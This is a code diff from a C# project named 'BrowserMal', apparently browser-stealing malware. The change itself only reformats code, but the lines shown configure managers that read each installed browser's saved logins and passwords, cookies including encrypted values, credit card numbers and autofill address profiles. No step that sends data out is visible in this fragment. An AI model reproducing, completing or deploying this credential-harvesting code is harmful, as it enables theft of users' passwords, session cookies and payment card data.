@@ -1,6 +1,4 @@
 ﻿using BrowserMal.Browser;
-using BrowserMal.Credential;
-using BrowserMal.Cookie;
 using System.Collections.Generic;
 using BrowserMal.Manager;
 using BrowserMal.Model;
@@ -16,14 +14,31 @@ namespace BrowserMal
             browserManager.Init();
             List<BrowserModel> browsers = browserManager.GetBrowsers();
 
-            GenericManager<CredentialModel> credentialManager = new GenericManager<CredentialModel>("logins", new string[] { "origin_url", "username_value", "password_value" }, true);
+            GenericManager<CredentialModel> credentialManager = new GenericManager<CredentialModel>("logins", new string[] 
+            { 
+                "origin_url", 
+                "username_value", 
+                "password_value" 
+            }, true);
             credentialManager.Init(ref browsers, Browser.Util.LOGIN_DATA);
 
-            GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new string[] { "host_key", "name", "path", "encrypted_value" }, true);
+            GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new string[] 
+            { 
+                "host_key", 
+                "name", 
+                "path", 
+                "encrypted_value" 
+            }, true);
             cookiesManager.Init(ref browsers, Browser.Util.COOKIES);
 
-            GenericManager<CreditCardModel> creditManager = new GenericManager<CreditCardModel>("credit_cards", 
-                new string[] { "name_on_card", "expiration_month", "expiration_year", "nickname", "card_number_encrypted" }, true);
+            GenericManager<CreditCardModel> creditManager = new GenericManager<CreditCardModel>("credit_cards", new string[] 
+            { 
+                "name_on_card", 
+                "expiration_month", 
+                "expiration_year", 
+                "nickname", 
+                "card_number_encrypted" 
+            }, true);
             creditManager.Init(ref browsers, Browser.Util.WEB_DATA);
 
             GenericManager<AddressesModel> addressesManager = new GenericManager<AddressesModel>("autofill_profiles", new string[]
